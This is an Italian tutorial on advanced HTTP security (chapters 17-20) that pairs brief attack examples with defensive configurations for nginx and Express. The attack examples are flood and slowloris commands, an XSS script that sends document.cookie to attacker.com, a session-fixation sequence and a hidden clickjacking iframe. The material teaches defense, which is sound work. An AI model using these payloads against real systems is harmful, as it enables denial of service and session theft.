# Capitoli 17-20: Sicurezza HTTP Avanzata
# DoS, Session Security, Clickjacking, Information Disclosure

---

# 17. Denial of Service (DoS/DDoS)

## 17.1 HTTP Flood Attack

### Attacco
```bash
# Simple flood
while true; do curl http://example.com & done

# Apache Bench flood
ab -n 100000 -c 1000 http://example.com/

# Slowloris
slowloris -s 500 example.com
```

### Mitigation - Rate Limiting

**Nginx:**
```nginx
http {
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    server {
        location /api/ {
            limit_req zone=one burst=20 nodelay;
        }
    }
}
```

**Express.js:**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    message: 'Too many requests'
});

app.use('/api/', limiter);
```

## 17.2 Slowloris Attack

### Come funziona
```
POST /upload HTTP/1.1
Host: example.com
Content-Length: 1000000

[invia 1 byte ogni 10 secondi]
→ Connessione rimane aperta
→ Esaurisce risorse server
```

### Mitigation
```nginx
client_body_timeout 10s;
client_header_timeout 10s;
send_timeout 10s;
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;
```

---

# 18. Session Hijacking

## 18.1 Cookie Theft via XSS

### Attacco
```javascript
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### Defense - HttpOnly Cookie
```javascript
app.use(session({
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    }
}));
```

## 18.2 Session Fixation

### Attacco
```
1. Attaccante: SESSIONID=abc123
2. Vittima visita: example.com/?SESSIONID=abc123
3. Vittima fa login (sessione abc123 autenticata)
4. Attaccante usa abc123 → accesso!
```

### Defense
```javascript
app.post('/login', (req, res) => {
    if (authenticate(req.body.username, req.body.password)) {
        req.session.regenerate((err) => {
            req.session.user = req.body.username;
            res.redirect('/dashboard');
        });
    }
});
```

---

# 19. Clickjacking

## 19.1 Attacco

```html
<style>
iframe { opacity: 0; position: absolute; }
</style>
<h1>Vinci un premio!</h1>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

## 19.2 Defense - X-Frame-Options

```nginx
add_header X-Frame-Options "DENY";
```

```javascript
app.use((req, res, next) => {
    res.setHeader("X-Frame-Options", "SAMEORIGIN");
    res.setHeader("Content-Security-Policy", "frame-ancestors 'self'");
    next();
});
```

---

# 20. Information Disclosure

## 20.1 Server Headers

### Problema
```http
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

### Soluzione
```nginx
server_tokens off;
```

```javascript
app.disable('x-powered-by');
```

## 20.2 Error Messages

### Problema
```javascript
app.get('/api/user', (req, res) => {
    db.query(query, (err) => {
        res.status(500).send(err.stack); // ❌ Leak info
    });
});
```

### Soluzione
```javascript
app.get('/api/user', (req, res) => {
    db.query(query, (err, results) => {
        if (err) {
            console.error(err);
            res.status(500).send('Internal server error');
        } else {
            res.json(results);
        }
    });
});
```

---

**Capitoli 17-20 completati!**
